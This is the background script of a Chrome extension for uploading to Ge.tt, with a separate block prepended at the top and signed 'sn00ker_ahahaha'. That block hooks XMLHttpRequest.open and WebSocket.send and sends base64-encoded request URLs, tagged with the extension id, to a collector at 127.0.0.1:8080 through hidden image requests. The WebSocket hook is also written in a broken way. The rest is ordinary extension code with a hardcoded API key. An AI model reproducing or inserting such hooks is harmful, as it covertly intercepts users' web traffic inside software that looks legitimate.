function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var app;

debug.setLevel(5);
synchronization.initialize();

(function() {
	var common = require('common');
	var gett = require('api');
	var download = require('download');
	var upload = require('upload');
	var gc = require('gc').create();
	var models = require('models').create('open.ge.tt');
	var opts = require('user-options');
	var menu = require('context-menu');

	var NOTIFICATION_POLL_FREQUENCY = 300000;
	var LIVE_API_RETRY = 10000;
	var APP_KEY = 'tkrxghhdxoy5019k9tmrxwkc9cd4h1tt9';
	
	var noop = function() {};
	var login = function(credentials, callback) {
		var onerror;

		common.step([
			function(next) {
				onerror = setTimeout(function() {
					var err = new Error('Login failed');
					err.statusCode = 0;
					onerror = null;

					next(err);
				}, 5000);

				gett(credentials, next);
			},
			function(api) {
				if(!onerror) {
					return;
				}

				clearTimeout(onerror);
				callback(null, api);
			}
		], function(err) {
			clearTimeout(onerror);
			callback(err);
		});
	};

	app = common.future();

	var comparator = function(options, value) {
		if(typeof value !== 'undefined') {
			var name = options;
			options = {};

			options[name] = value;
		}

		return function(item) {
			for(var j in options) {
				if(item[j] !== options[j]) {
					return false;
				}
			}

			return true;
		};
	};
	var findBy = function(arr, options, value) {
		var match = comparator(options, value);

		for(var i = 0; i < arr.length; i++) {
			var item = arr[i];

			if(match(item)) {
				return item;
			}
		}

		return null;
	};

	var ShareCollection = common.emitter(function(api) {
		this._updating = false;
		this._api = api;

		this._shares = [];
	});

	ShareCollection.prototype.add = function(share) {
		this._shares.splice(0, 0, this._buildShare(share));

		this.emit('share');
	};
	ShareCollection.prototype.get = function(options, value) {
		return findBy(this._shares, options, value);
	};
	ShareCollection.prototype.all = function(options, value) {
		if(!options) {
			return [].concat(this._shares);
		}

		return this._shares.filter(comparator(options, value));
	};
	ShareCollection.prototype.update = function(callback) {
		var self = this;

		callback = callback || noop;

		if(this._updating) {
			debug.warn('Update in progress. Aborting new update.');

			callback(new Error('Update in progress'));
			return;
		}

		this._updating = true;

		common.step([
			function(next) {
				debug.debug('Updating shares list');

				self._api.get('/1/shares', next);
			},
			function(result) {
				self._updating = false;
				self._shares = result.map(function(share) {
					return self._buildShare(share);
				});

				self.emit('update');

				callback();
			}
		], function(err) {
			self._updating = false;
			callback(err);
		});
	};
	ShareCollection.prototype._buildShare = function(share) {
		var self = this;

		share = models.share(share);

		share.file = function(options, value) {
			return findBy(this.files, options, value);
		};
		share.addFile = function(file) {
			var f = this.file({ filename: file.filename });
			var index = this.files.indexOf(f);

			if(index !== -1) {
				this.files.splice(index, 1);
			}

			this.files.push(models.file(file, share));
			self.emit('file');
		};

		return share;
	};

	var application = common.join(common.createEmitter(), {
		uploadManager: null,
		unreadNotifications: 0,
		state: 'remote',
		userOptions: opts.create({
			enableContextMenu: true
		}),
		login: function(credentials, callback) {
			if(!callback) {
				callback = credentials;

				var user = this.user();

				if(!user) {
					callback(new Error('Local user does not exist'));
					return;
				}

				credentials = {
					refreshtoken: user.refreshtoken
				};
			}

			callback = callback || noop;

			var self = this;

			common.step([
				function(next) {
					login(common.join(credentials, { apikey: APP_KEY }), next);
				},
				function(api) {
					self.state = 'ready';
					self.api = api;
					self.shares = new ShareCollection(api);
					self.uploadManager = upload.create(download.create(), api);

					synchronization._refreshtoken = api.refreshtoken;

					self._writeLocal(api);

					self._pollNotifications();
					self._receiveLiveUpdates();

					self.emit('login', self.user());

					callback();
				}
			], callback);
		},
		logout: function() {
			this.api = null;
			this.uploadManager = null;
			this.shares = null;
			this.state = 'remote';
			this._user = null;

			synchronization._refreshtoken = null;

			this._writeLocal();
			clearTimeout(this._notificationPoll);

			this._clearLiveUpdates();

			this.emit('logout');
		},
		user: function() {
			if(this._user) {
				return this._user;
			}

			return (this._user = this._readLocal());
		},
		notifications: function(options, callback) {
			if(!callback) {
				callback = options;
				options = {};
			}

			var self = this;

			options = options || {};
			options.limit = options.limit || 5;
			options.read = typeof options.read === 'undefined' ? true : options.read;

			this.api.get({
				url: '/1/notifications' + (options.read ? '/read' : ''), 
				query: { limit: options.limit } 
			}, function(err, notifications) {
				if(!err && options.read) {
					var unreadChanged = self.unreadNotifications !== 0;
					self.unreadNotifications = 0;

					if(unreadChanged) {
						self.emit('notification', 0);
					}
				} 

				callback(err, notifications);
			});
		},
		is: function(state) {
			return this.state === state;
		},
		onPopupLeave: function() {
			debug.debug('Popup leave');

			gc.free();
		},
		_liveSocket: null,
		_liveSocketRetry: null,
		_notificationPoll: null,
		_readLocal: function() {
			var user = localStorage.getItem('user');

			if(user) {
				return JSON.parse(user);
			}
		},
		_writeLocal: function(api) {
			if(!api) {
				localStorage.removeItem('user');
				return;
			}

			this._user = {
				userid: api.userid,
				fullname: api.fullname,
				email: api.email,
				type: api.type,
				created: api.created,
				refreshtoken: api.refreshtoken
			};

			localStorage.setItem('user', JSON.stringify(this._user));
		},
		_pollNotifications: function() {
			var self = this;

			var schedule = function() {
				clearTimeout(self._notificationPoll);

				if(self.is('remote')) {
					return;
				}

				self._notificationPoll = setTimeout(self._pollNotifications.bind(self), NOTIFICATION_POLL_FREQUENCY);
			};

			common.step([
				function(next) {
					self.notifications({ read: false }, next);
				},
				function(notifications) {
					var unread = notifications.reduce(function(acc, n) {
						return acc + (n.unread ? 1 : 0);
					}, 0);

					if(unread !== self.unreadNotifications) {
						self.unreadNotifications = unread;
						self.emit('notification', unread);
					}

					schedule();
				}
			], schedule);
		},
		_receiveLiveUpdates: function() {
			this._clearLiveUpdates();
			
			var self = this;
			var socket = this._liveSocket = new WebSocket('ws://open.ge.tt');

			socket.onopen = function() {
				debug.debug('Live socket open', self.user());

				socket.send(JSON.stringify({ 
					type: 'connect',
					accesstoken: self.api.accesstoken, 
					session: self.api.session
				}));
			};
			socket.onmessage = function(e) {
				if(e.data === 'ping') {
					socket.send('pong');
					return;
				}

				var message = JSON.parse(e.data);

				debug.debug('Live update received', message);

				self.emit('live', message);
			};
			socket.onclose = function() {
				debug.debug('Live socket closed', self.state);

				if(self.is('remote')) {
					return;
				}

				self._liveSocketRetry = setTimeout(function() {
					if(self.is('remote')) {
						return;
					}

					self._receiveLiveUpdates();
				}, LIVE_API_RETRY);
			};
			socket.onerror = function(err) {
				debug.error('Live socket error', err);
			};
		},
		_clearLiveUpdates: function() {
			clearTimeout(this._liveSocketRetry);
			
			if(this._liveSocket && this._liveSocket.readyState in { 0:true, 1:true }) {
				this._liveSocket.close();
			}
		}
	});

	application.on('notification', function(unread) {
		chrome.browserAction.setBadgeText({ text: '' + (unread || '') });
	});

	application.on('error', function(err) {
		debug.error(err.stack || err.message || err);
	});
	application.on('login', function(user) {
		debug.info('Logged in', user);
	});
	application.on('logout', function() {
		debug.info('Logged out');
	});

	application.login(function(err) {
		app.put(application);
	});

	var error = function(err) {
		application.emit('error', err);
	};
	var queueUrl = function(e, sharename) {
		var url = e.srcUrl || e.linkUrl || e.frameUrl || e.pageUrl || '';
		var uploader = application.uploadManager.upload(url, sharename);

		uploader.on('error', error);

		gc.register(uploader);
	};

	var UploadMenu = function() {
		this._queuedUpdate = null;
		this._updating = false;

		this._upload = menu.createItem('Upload to Ge.tt');

		this._upload.add(menu.createItem('New album', { 
			name: 'newAlbum',
			onclick: function(e) {
				queueUrl(e);
			}
		}));
	};

	UploadMenu.prototype.create = function(callback) {
		this._upload.create(callback);
	};
	UploadMenu.prototype.destroy = function(callback) {
		this._upload.destroy(callback);
	};
	UploadMenu.prototype.update = function(shares) {
		if(this._updating) {
			this._queuedUpdate = shares;
			return;
		}

		this._updating = true;

		var self = this;
		var sharesMenu = this._upload.get('shares');
		var queuedUpdate = function() {
			self._updating = false;
			
			if(self._queuedUpdate) {
				var queuedShares = self._queuedUpdate;
				self._queuedUpdate = null;

				self.update(queuedShares);

				return;
			}
		};
		var create = this._shareItems.bind(this, shares, queuedUpdate);

		if(sharesMenu) {
			sharesMenu.destroy(create);
			return;
		}

		create();
	};
	UploadMenu.prototype._shareItems = function(shares, callback) {
		if(!shares.length) {
			callback();
			return;
		}

		var sharesMenu = menu.createItemGroup({ name: 'shares' });
		var existing = menu.createItem('Existing album', { name: 'existingAlbum' });

		sharesMenu.add(existing);

		shares.forEach(function(share) {
			existing.add(menu.createItem(share.getTitle(), {
				onclick: function(e) {
					queueUrl(e, share.sharename);
				}
			}));
		});

		sharesMenu.add(menu.createSeparator());

		shares.slice(0, 5).forEach(function(share) {
			sharesMenu.add(menu.createItem(share.getTitle(), {
				onclick: function(e) {
					queueUrl(e, share.sharename);
				}
			}));
		});

		this._upload.add(sharesMenu);

		if(this._upload.id) {
			sharesMenu.create(callback);
			return;
		}

		callback();
	};

	app.get(function(application) {
		var uploadMenu;

		var cleaner = (function() {
			var handlers = [];
			var wrapper = function(emitter) {
				return {
					on: function(event, handler) {
						handlers.push({ emitter: emitter, event: event, handler: handler });
						return emitter.on(event, handler);
					}
				};
			};

			wrapper.free = function() {
				while(handlers.length) {
					var listener = handlers.pop();

					listener.emitter.removeListener(listener.event, listener.handler);
				}
			};

			return wrapper;
		})();

		var onApplicationReady = function(application) {
			var shares = application.shares;
			var uploadManager = application.uploadManager;

			var update = function() {
				if(!uploadMenu) {
					debug.debug('Upload menu not created. Update aborted.');

					return;
				}

				debug.debug('Updating upload menu');

				uploadMenu.update(shares.all());
			};

			cleaner(shares).on('update', update);
			cleaner(shares).on('file', update);

			cleaner(uploadManager).on('share', function(share) {
				shares.add(share);
				chrome.tabs.create({ url: 'http://ge.tt/' + share.sharename, active: false });
			});
			cleaner(uploadManager).on('file', function(file) {
				var share = shares.get({ sharename: file.sharename });

				if(!share) {
					debug.warn('No share matching', file, shares);
					return;
				}

				share.addFile(file);
			});
			cleaner(uploadManager).on('start', function() {
				chrome.browserAction.setIcon({ path: '/images/icons/gett_19_upload.png' });
			});
			cleaner(uploadManager).on('end', function() {
				if(!uploadManager.activeUploads()) {
					chrome.browserAction.setIcon({ path: '/images/icons/gett_19.png' });
				}
			});
		};

		application.on('login', function() {
			application.userOptions.bootstrap();
		});
		application.on('logout', function() {
			application.userOptions.bootstrap({ enableContextMenu: false });
		});
		application.on('live', function(message) {
			if(message.type !== 'filestat' || !uploadMenu) {
				return;
			}

			var shares = application.shares;
			var share = shares.get({ sharename: message.sharename });

			if(share && share.file({ fileid: message.fileid })) {
				return;
			}

			shares.update();
		});

		application.userOptions.on('change', function(opts) {
			debug.debug('User options changed', opts);

			if(opts.enableContextMenu) {
				if(!application.is('ready') || uploadMenu) {
					return;
				}

				uploadMenu = new UploadMenu();
				
				onApplicationReady(application);

				application.shares.update(function() {
					uploadMenu.create();
				});
			} else {
				if(!uploadMenu) {
					return;
				}

				uploadMenu.destroy();
				cleaner.free();

				uploadMenu = null;
			}
		});

		application.userOptions.bootstrap();
	});
})();
